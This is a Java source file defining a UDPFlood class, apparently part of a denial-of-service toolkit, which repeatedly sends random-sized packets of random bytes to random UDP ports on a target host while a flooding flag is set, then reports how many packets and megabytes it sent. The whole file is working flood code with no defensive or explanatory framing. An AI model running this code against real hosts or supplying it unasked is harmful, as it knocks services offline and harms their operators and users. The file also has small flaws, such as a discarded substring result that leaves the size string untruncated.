package syn.net;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Random;

import syn.utils.Utilities;

public class UDPFlood extends Flood {

	private DatagramSocket socket;
	private DatagramPacket packet;
	private static int packetCount;
	private static double totalSize;
	
	public UDPFlood(String target) {
		super(target);
	}
	
	public void run() {
		Random rand = new Random();
		int udpPort = 0;
		byte[] bytes;
		
		int breakTime = 2000;
		while(Flood.isFlooding()) {
			try {
				int packetSize = rand.nextInt(736);
				udpPort = rand.nextInt(65536);
				socket = new DatagramSocket();
				socket.connect(InetAddress.getByName(super.getTarget()), udpPort);
				bytes = new byte[packetSize];
				rand.nextBytes(bytes);
				packet = new DatagramPacket(bytes, bytes.length);
				socket.send(packet);
				packetCount++;
				totalSize += ((packetSize / 1000.0) / 1000.0);
				System.out.println("debug: sent packet " + packetSize + " at port " + udpPort);
			} catch (Exception ex) {}
			breakTime--;
			if(breakTime == 0) {
				try {
					Thread.sleep(100);
				} catch (InterruptedException e) {}
			}
		}
		socket.close();
		if(!resultsSent) {
			resultsSent = true;
			Utilities uc = new Utilities();
			String totalSizeTruncated = totalSize + "";
			totalSizeTruncated.substring(0, 6);
			uc.write(packetCount + " packets sent, total of " + totalSizeTruncated + "MB");
		}
	}
}
